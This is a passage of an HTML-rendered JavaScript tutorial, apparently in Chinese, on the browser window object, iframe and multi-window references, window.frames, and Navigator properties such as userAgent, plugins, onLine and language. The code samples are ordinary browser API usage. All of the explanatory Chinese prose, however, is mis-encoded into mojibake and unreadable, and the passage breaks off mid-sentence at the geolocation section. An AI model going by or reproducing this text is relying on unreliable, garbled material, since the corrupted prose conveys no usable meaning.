</code></pre></div><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè„šæœ¬ç½‘å€ä¸ç½‘é¡µç½‘å€ä¸åœ¨åŒä¸€ä¸ªåŸŸï¼ˆæ¯”å¦‚ä½¿ç”¨äº† CDNï¼‰ï¼Œæµè§ˆå™¨æ ¹æœ¬ä¸ä¼šæä¾›è¯¦ç»†çš„å‡ºé”™ä¿¡æ¯ï¼Œåªä¼šæç¤ºå‡ºé”™ï¼Œé”™è¯¯ç±»å‹æ˜¯â€œScript error.â€ï¼Œè¡Œå·ä¸º0ï¼Œå…¶ä»–ä¿¡æ¯éƒ½æ²¡æœ‰ã€‚è¿™æ˜¯æµè§ˆå™¨é˜²æ­¢å‘å¤–éƒ¨è„šæœ¬æ³„æ¼ä¿¡æ¯ã€‚ä¸€ä¸ªè§£å†³æ–¹æ³•æ˜¯åœ¨è„šæœ¬æ‰€åœ¨çš„æœåŠ¡å™¨ï¼Œè®¾ç½®<code>Access-Control-Allow-Origin</code>çš„ HTTP å¤´ä¿¡æ¯ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>Access<span class="token operator">-</span>Control<span class="token operator">-</span>Allow<span class="token operator">-</span>Origin<span class="token operator">:</span> <span class="token operator">*</span>
</code></pre></div><p>ç„¶åï¼Œåœ¨ç½‘é¡µçš„<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­è®¾ç½®<code>crossorigin</code>å±æ€§ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>anonymous<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>//example.com/file.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸Šé¢ä»£ç çš„<code>crossorigin=&quot;anonymous&quot;</code>è¡¨ç¤ºï¼Œè¯»å–æ–‡ä»¶ä¸éœ€è¦èº«ä»½ä¿¡æ¯ï¼Œå³ä¸éœ€è¦ cookie å’Œ HTTP è®¤è¯ä¿¡æ¯ã€‚å¦‚æœè®¾ä¸º<code>crossorigin=&quot;use-credentials&quot;</code>ï¼Œå°±è¡¨ç¤ºæµè§ˆå™¨ä¼šä¸Šä¼  cookie å’Œ HTTP è®¤è¯ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜éœ€è¦æœåŠ¡å™¨ç«¯æ‰“å¼€ HTTP å¤´ä¿¡æ¯<code>Access-Control-Allow-Credentials</code>ã€‚</p><h4 id="window-å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§" tabindex="-1"><a class="header-anchor" href="#window-å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§" aria-hidden="true">#</a> window å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§</h4><p>é™¤äº†å…·å¤‡å…ƒç´ èŠ‚ç‚¹éƒ½æœ‰çš„ GlobalEventHandlers æ¥å£ï¼Œ<code>window</code>å¯¹è±¡è¿˜å…·æœ‰ä»¥ä¸‹çš„äº‹ä»¶ç›‘å¬å‡½æ•°å±æ€§ã€‚</p><ul><li><code>window.onafterprint</code>ï¼š<code>afterprint</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onbeforeprint</code>ï¼š<code>beforeprint</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onbeforeunload</code>ï¼š<code>beforeunload</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onhashchange</code>ï¼š<code>hashchange</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onlanguagechange</code>: <code>languagechange</code>çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onmessage</code>ï¼š<code>message</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onmessageerror</code>ï¼š<code>MessageError</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onoffline</code>ï¼š<code>offline</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.ononline</code>ï¼š<code>online</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onpagehide</code>ï¼š<code>pagehide</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onpageshow</code>ï¼š<code>pageshow</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onpopstate</code>ï¼š<code>popstate</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onstorage</code>ï¼š<code>storage</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onunhandledrejection</code>ï¼šæœªå¤„ç†çš„ Promise å¯¹è±¡çš„<code>reject</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li><li><code>window.onunload</code>ï¼š<code>unload</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li></ul><h3 id="å¤šçª—å£æ“ä½œ" tabindex="-1"><a class="header-anchor" href="#å¤šçª—å£æ“ä½œ" aria-hidden="true">#</a> å¤šçª—å£æ“ä½œ</h3><p>ç”±äºç½‘é¡µå¯ä»¥ä½¿ç”¨<code>iframe</code>å…ƒç´ ï¼ŒåµŒå…¥å…¶ä»–ç½‘é¡µï¼Œå› æ­¤ä¸€ä¸ªç½‘é¡µä¹‹ä¸­ä¼šå½¢æˆå¤šä¸ªçª—å£ã€‚å¦‚æœå­çª—å£ä¹‹ä¸­åˆåµŒå…¥åˆ«çš„ç½‘é¡µï¼Œå°±ä¼šå½¢æˆå¤šçº§çª—å£ã€‚</p><h4 id="çª—å£çš„å¼•ç”¨" tabindex="-1"><a class="header-anchor" href="#çª—å£çš„å¼•ç”¨" aria-hidden="true">#</a> çª—å£çš„å¼•ç”¨</h4><p>å„ä¸ªçª—å£ä¹‹ä¸­çš„è„šæœ¬ï¼Œå¯ä»¥å¼•ç”¨å…¶ä»–çª—å£ã€‚æµè§ˆå™¨æä¾›äº†ä¸€äº›ç‰¹æ®Šå˜é‡ï¼Œç”¨æ¥è¿”å›å…¶ä»–çª—å£ã€‚</p><ul><li><code>top</code>ï¼šé¡¶å±‚çª—å£ï¼Œå³æœ€ä¸Šå±‚çš„é‚£ä¸ªçª—å£</li><li><code>parent</code>ï¼šçˆ¶çª—å£</li><li><code>self</code>ï¼šå½“å‰çª—å£ï¼Œå³è‡ªèº«</li></ul><p>ä¸‹é¢ä»£ç å¯ä»¥åˆ¤æ–­ï¼Œå½“å‰çª—å£æ˜¯å¦ä¸ºé¡¶å±‚çª—å£ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>top <span class="token operator">===</span> window<span class="token punctuation">.</span>self<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// å½“å‰çª—å£æ˜¯é¡¶å±‚çª—å£</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token comment">// å½“å‰çª—å£æ˜¯å­çª—å£</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸‹é¢çš„ä»£ç è®©çˆ¶çª—å£çš„è®¿é—®å†å²åé€€ä¸€æ¬¡ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸è¿™äº›å˜é‡å¯¹åº”ï¼Œæµè§ˆå™¨è¿˜æä¾›ä¸€äº›ç‰¹æ®Šçš„çª—å£åï¼Œä¾›<code>window.open()</code>æ–¹æ³•ã€<code>&lt;a&gt;</code>æ ‡ç­¾ã€<code>&lt;form&gt;</code>æ ‡ç­¾ç­‰å¼•ç”¨ã€‚</p><ul><li><code>_top</code>ï¼šé¡¶å±‚çª—å£</li><li><code>_parent</code>ï¼šçˆ¶çª—å£</li><li><code>_blank</code>ï¼šæ–°çª—å£</li></ul><p>ä¸‹é¢ä»£ç å°±è¡¨ç¤ºåœ¨é¡¶å±‚çª—å£æ‰“å¼€é“¾æ¥ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;somepage.html&quot;</span> target<span class="token operator">=</span><span class="token string">&quot;_top&quot;</span><span class="token operator">&gt;</span>Link<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
</code></pre></div><h4 id="iframe-å…ƒç´ " tabindex="-1"><a class="header-anchor" href="#iframe-å…ƒç´ " aria-hidden="true">#</a> iframe å…ƒç´ </h4><p>å¯¹äº<code>iframe</code>åµŒå…¥çš„çª—å£ï¼Œ<code>document.getElementById</code>æ–¹æ³•å¯ä»¥æ‹¿åˆ°è¯¥çª—å£çš„ DOM èŠ‚ç‚¹ï¼Œç„¶åä½¿ç”¨<code>contentWindow</code>å±æ€§è·å¾—<code>iframe</code>èŠ‚ç‚¹åŒ…å«çš„<code>window</code>å¯¹è±¡ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> frame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;theFrame&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> frameWindow <span class="token operator">=</span> frame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>frame.contentWindow</code>å¯ä»¥æ‹¿åˆ°å­çª—å£çš„<code>window</code>å¯¹è±¡ã€‚ç„¶åï¼Œåœ¨æ»¡è¶³åŒæºé™åˆ¶çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è¯»å–å­çª—å£å†…éƒ¨çš„å±æ€§ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// è·å–å­çª—å£çš„æ ‡é¢˜</span>
frameWindow<span class="token punctuation">.</span>title
</code></pre></div><p>iframe å…ƒç´ çš„contentDocumentå±æ€§ï¼Œå¯ä»¥æ‹¿åˆ°å­çª—å£çš„documentå¯¹è±¡ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> frame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;theFrame&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> frameDoc <span class="token operator">=</span> frame<span class="token punctuation">.</span>contentDocument<span class="token punctuation">;</span>

<span class="token comment">// ç­‰åŒäº</span>
<span class="token keyword">var</span> frameDoc <span class="token operator">=</span> frame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">;</span>
</code></pre></div><p>iframe å…ƒç´ éµå®ˆåŒæºæ”¿ç­–ï¼Œåªæœ‰å½“çˆ¶çª—å£ä¸å­çª—å£åœ¨åŒä¸€ä¸ªåŸŸæ—¶ï¼Œä¸¤è€…ä¹‹é—´æ‰å¯ä»¥ç”¨è„šæœ¬é€šä¿¡ï¼Œå¦åˆ™åªæœ‰ä½¿ç”¨window.postMessageæ–¹æ³•ã€‚</p><p>iframe çª—å£å†…éƒ¨ï¼Œä½¿ç”¨window.parentå¼•ç”¨çˆ¶çª—å£ã€‚å¦‚æœå½“å‰é¡µé¢æ²¡æœ‰çˆ¶çª—å£ï¼Œåˆ™window.parentå±æ€§è¿”å›è‡ªèº«ã€‚å› æ­¤ï¼Œå¯ä»¥é€šè¿‡window.parentæ˜¯å¦ç­‰äºwindow.selfï¼Œåˆ¤æ–­å½“å‰çª—å£æ˜¯å¦ä¸ºiframeçª—å£ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>parent <span class="token operator">!==</span> window<span class="token punctuation">.</span>self<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// å½“å‰çª—å£æ˜¯å­çª—å£</span>
<span class="token punctuation">}</span>
</code></pre></div><p>iframe çª—å£çš„windowå¯¹è±¡ï¼Œæœ‰ä¸€ä¸ªframeElementå±æ€§ï¼Œè¿”å› iframe åœ¨çˆ¶çª—å£ä¸­çš„ DOM èŠ‚ç‚¹ã€‚å¯¹äºéåµŒå…¥çš„çª—å£ï¼Œè¯¥å±æ€§ç­‰äºnullã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> f1Element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;f1&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f1Window <span class="token operator">=</span> f1Element<span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>

f1Window<span class="token punctuation">.</span>frameElement <span class="token operator">===</span> f1Element <span class="token comment">// true</span>
window<span class="token punctuation">.</span>frameElement <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token comment">// true</span>
</code></pre></div><h4 id="window-frames-å±æ€§" tabindex="-1"><a class="header-anchor" href="#window-frames-å±æ€§" aria-hidden="true">#</a> window.frames å±æ€§</h4><p><code>window.frames</code>å±æ€§è¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œæˆå‘˜æ˜¯æ‰€æœ‰å­çª—å£çš„<code>window</code>å¯¹è±¡ã€‚å¯ä»¥ä½¿ç”¨è¿™ä¸ªå±æ€§ï¼Œå®ç°çª—å£ä¹‹é—´çš„äº’ç›¸å¼•ç”¨ã€‚æ¯”å¦‚ï¼Œ<code>frames[0]</code>è¿”å›ç¬¬ä¸€ä¸ªå­çª—å£ï¼Œ<code>frames[1].frames[2]</code>è¿”å›ç¬¬äºŒä¸ªå­çª—å£å†…éƒ¨çš„ç¬¬ä¸‰ä¸ªå­çª—å£ï¼Œ<code>parent.frames[1]</code>è¿”å›çˆ¶çª—å£çš„ç¬¬äºŒä¸ªå­çª—å£ã€‚</p><p>æ³¨æ„ï¼Œ<code>window.frames</code>æ¯ä¸ªæˆå‘˜çš„å€¼ï¼Œæ˜¯æ¡†æ¶å†…çš„çª—å£ï¼ˆå³æ¡†æ¶çš„<code>window</code>å¯¹è±¡ï¼‰ï¼Œè€Œä¸æ˜¯<code>iframe</code>æ ‡ç­¾åœ¨çˆ¶çª—å£çš„ DOM èŠ‚ç‚¹ã€‚å¦‚æœè¦è·å–æ¯ä¸ªæ¡†æ¶å†…éƒ¨çš„ DOM æ ‘ï¼Œéœ€è¦ä½¿ç”¨<code>window.frames[0].document</code>çš„å†™æ³•ã€‚</p><p>å¦å¤–ï¼Œå¦‚æœ<code>&lt;iframe&gt;</code>å…ƒç´ è®¾ç½®äº†<code>name</code>æˆ–<code>id</code>å±æ€§ï¼Œé‚£ä¹ˆå±æ€§å€¼ä¼šè‡ªåŠ¨æˆä¸ºå…¨å±€å˜é‡ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡<code>window.frames</code>å±æ€§å¼•ç”¨ï¼Œè¿”å›å­çª—å£çš„<code>window</code>å¯¹è±¡ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç ä¸º &lt;iframe id=&quot;myFrame&quot;&gt;</span>
window<span class="token punctuation">.</span>myFrame <span class="token comment">// [HTMLIFrameElement]</span>
frames<span class="token punctuation">.</span>myframe <span class="token operator">===</span> myFrame <span class="token comment">// true</span>
</code></pre></div><p>å¦å¤–ï¼Œ<code>name</code>å±æ€§çš„å€¼ä¼šè‡ªåŠ¨æˆä¸ºå­çª—å£çš„åç§°ï¼Œå¯ä»¥ç”¨åœ¨<code>window.open</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œæˆ–è€…<code>&lt;a&gt;</code>å’Œ<code>&lt;frame&gt;</code>æ ‡ç­¾çš„<code>target</code>å±æ€§ã€‚</p><h2 id="navigator-å¯¹è±¡ä¸-screen-å¯¹è±¡" tabindex="-1"><a class="header-anchor" href="#navigator-å¯¹è±¡ä¸-screen-å¯¹è±¡" aria-hidden="true">#</a> Navigator å¯¹è±¡ä¸ Screen å¯¹è±¡</h2><h3 id="navigator-å¯¹è±¡çš„å±æ€§" tabindex="-1"><a class="header-anchor" href="#navigator-å¯¹è±¡çš„å±æ€§" aria-hidden="true">#</a> Navigator å¯¹è±¡çš„å±æ€§</h3><h4 id="navigator-useragent" tabindex="-1"><a class="header-anchor" href="#navigator-useragent" aria-hidden="true">#</a> Navigator.userAgent</h4><p><code>navigator.userAgent</code>å±æ€§è¿”å›æµè§ˆå™¨çš„ User Agent å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„å‚å•†å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚</p><p>ä¸‹é¢æ˜¯ Chrome æµè§ˆå™¨çš„<code>userAgent</code>ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>userAgent
<span class="token comment">// &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36&quot;</span>
</code></pre></div><p>é€šè¿‡<code>userAgent</code>å±æ€§è¯†åˆ«æµè§ˆå™¨ï¼Œä¸æ˜¯ä¸€ä¸ªå¥½åŠæ³•ã€‚å› ä¸ºå¿…é¡»è€ƒè™‘æ‰€æœ‰çš„æƒ…å†µï¼ˆä¸åŒçš„æµè§ˆå™¨ï¼Œä¸åŒçš„ç‰ˆæœ¬ï¼‰ï¼Œéå¸¸éº»çƒ¦ï¼Œè€Œä¸”ç”¨æˆ·å¯ä»¥æ”¹å˜è¿™ä¸ªå­—ç¬¦ä¸²ã€‚è¿™ä¸ªå­—ç¬¦ä¸²çš„æ ¼å¼å¹¶æ— ç»Ÿä¸€è§„å®šï¼Œä¹Ÿæ— æ³•ä¿è¯æœªæ¥çš„é€‚ç”¨æ€§ï¼Œå„ç§ä¸Šç½‘è®¾å¤‡å±‚å‡ºä¸ç©·ï¼Œéš¾ä»¥ç©·å°½ã€‚æ‰€ä»¥ï¼Œç°åœ¨ä¸€èˆ¬ä¸å†é€šè¿‡å®ƒè¯†åˆ«æµè§ˆå™¨äº†ï¼Œè€Œæ˜¯ä½¿ç”¨â€œåŠŸèƒ½è¯†åˆ«â€æ–¹æ³•ï¼Œå³é€ä¸€æµ‹è¯•å½“å‰æµè§ˆå™¨æ˜¯å¦æ”¯æŒè¦ç”¨åˆ°çš„ JavaScript åŠŸèƒ½ã€‚</p><p>ä¸è¿‡ï¼Œé€šè¿‡<code>userAgent</code>å¯ä»¥å¤§è‡´å‡†ç¡®åœ°è¯†åˆ«æ‰‹æœºæµè§ˆå™¨ï¼Œæ–¹æ³•å°±æ˜¯æµ‹è¯•æ˜¯å¦åŒ…å«<code>mobi</code>å­—ç¬¦ä¸²ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> ua <span class="token operator">=</span> navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">mobi</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>ua<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// æ‰‹æœºæµè§ˆå™¨</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token comment">// éæ‰‹æœºæµè§ˆå™¨</span>
<span class="token punctuation">}</span>
</code></pre></div><p>å¦‚æœæƒ³è¦è¯†åˆ«æ‰€æœ‰ç§»åŠ¨è®¾å¤‡çš„æµè§ˆå™¨ï¼Œå¯ä»¥æµ‹è¯•æ›´å¤šçš„ç‰¹å¾å­—ç¬¦ä¸²ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">mobi|android|touch|mini</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>ua<span class="token punctuation">)</span>
</code></pre></div><h4 id="navigator-plugins" tabindex="-1"><a class="header-anchor" href="#navigator-plugins" aria-hidden="true">#</a> Navigator.plugins</h4><p><code>Navigator.plugins</code>å±æ€§è¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œæˆå‘˜æ˜¯ Plugin å®ä¾‹å¯¹è±¡ï¼Œè¡¨ç¤ºæµè§ˆå™¨å®‰è£…çš„æ’ä»¶ï¼Œæ¯”å¦‚ Flashã€ActiveX ç­‰ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> pluginsLength <span class="token operator">=</span> navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>length<span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pluginsLength<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>version<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><h4 id="navigator-platform" tabindex="-1"><a class="header-anchor" href="#navigator-platform" aria-hidden="true">#</a> Navigator.platform</h4><p><code>Navigator.platform</code>å±æ€§è¿”å›ç”¨æˆ·çš„æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼Œæ¯”å¦‚<code>MacIntel</code>ã€<code>Win32</code>ã€<code>Linux x86_64</code>ç­‰ ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>platform
<span class="token comment">// &quot;Linux x86_64&quot;</span>
</code></pre></div><h4 id="navigator-online" tabindex="-1"><a class="header-anchor" href="#navigator-online" aria-hidden="true">#</a> Navigator.onLine</h4><p><code>navigator.onLine</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·å½“å‰åœ¨çº¿è¿˜æ˜¯ç¦»çº¿ï¼ˆæµè§ˆå™¨æ–­çº¿ï¼‰ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>onLine <span class="token comment">// true</span>
</code></pre></div><p>æœ‰æ—¶ï¼Œæµè§ˆå™¨å¯ä»¥è¿æ¥å±€åŸŸç½‘ï¼Œä½†æ˜¯å±€åŸŸç½‘ä¸èƒ½è¿é€šå¤–ç½‘ã€‚è¿™æ—¶ï¼Œæœ‰çš„æµè§ˆå™¨çš„<code>onLine</code>å±æ€§ä¼šè¿”å›<code>true</code>ï¼Œæ‰€ä»¥ä¸èƒ½å‡å®šåªè¦æ˜¯<code>true</code>ï¼Œç”¨æˆ·å°±ä¸€å®šèƒ½è®¿é—®äº’è”ç½‘ã€‚ä¸è¿‡ï¼Œå¦‚æœæ˜¯<code>false</code>ï¼Œå¯ä»¥æ–­å®šç”¨æˆ·ä¸€å®šç¦»çº¿ã€‚</p><p>ç”¨æˆ·å˜æˆåœ¨çº¿ä¼šè§¦å‘<code>online</code>äº‹ä»¶ï¼Œå˜æˆç¦»çº¿ä¼šè§¦å‘<code>offline</code>äº‹ä»¶ï¼Œå¯ä»¥é€šè¿‡<code>window.ononline</code>å’Œ<code>window.onoffline</code>æŒ‡å®šè¿™ä¸¤ä¸ªäº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;offline&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;offline&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;online&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;online&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><h4 id="navigator-language-navigator-languages" tabindex="-1"><a class="header-anchor" href="#navigator-language-navigator-languages" aria-hidden="true">#</a> Navigator.languageï¼ŒNavigator.languages</h4><p><code>Navigator.language</code>å±æ€§è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„é¦–é€‰è¯­è¨€ã€‚è¯¥å±æ€§åªè¯»ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>language <span class="token comment">// &quot;en&quot;</span>
</code></pre></div><p><code>Navigator.languages</code>å±æ€§è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œè¡¨ç¤ºç”¨æˆ·å¯ä»¥æ¥å—çš„è¯­è¨€ã€‚<code>Navigator.language</code>æ€»æ˜¯è¿™ä¸ªæ•°ç»„çš„ç¬¬ä¸€ä¸ªæˆå‘˜ã€‚HTTP è¯·æ±‚å¤´ä¿¡æ¯çš„<code>Accept-Language</code>å­—æ®µï¼Œå°±æ¥è‡ªè¿™ä¸ªæ•°ç»„ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>languages  <span class="token comment">// [&quot;en-US&quot;, &quot;en&quot;, &quot;zh-CN&quot;, &quot;zh&quot;, &quot;zh-TW&quot;]</span>
</code></pre></div><p>å¦‚æœè¿™ä¸ªå±æ€§å‘ç”Ÿå˜åŒ–ï¼Œå°±ä¼šåœ¨<code>window</code>å¯¹è±¡ä¸Šè§¦å‘<code>languagechange</code>äº‹ä»¶ã€‚</p><h4 id="navigator-geolocation" tabindex="-1"><a class="header-anchor" href="#navigator-geolocation" aria-hidden="true">#</a> Navigator.geolocation</h4><p><code>Navigator.geolocation</code>å±æ€§è¿”å›ä¸€ä¸ª Geolocation å¯¹è±¡ï¼ŒåŒ…å«ç”¨æˆ·åœ°ç†ä½ç½®çš„ä¿¡æ¯ã€‚æ³¨æ„ï¼Œè¯¥ API åªæœ‰åœ¨ HTTPS åè®®ä¸‹å¯ç”¨ï¼Œå¦åˆ™è°ƒç”¨ä¸‹é¢æ–¹æ³•æ—¶ä¼šæŠ¥é”™ã€‚</p><p>Geolocation 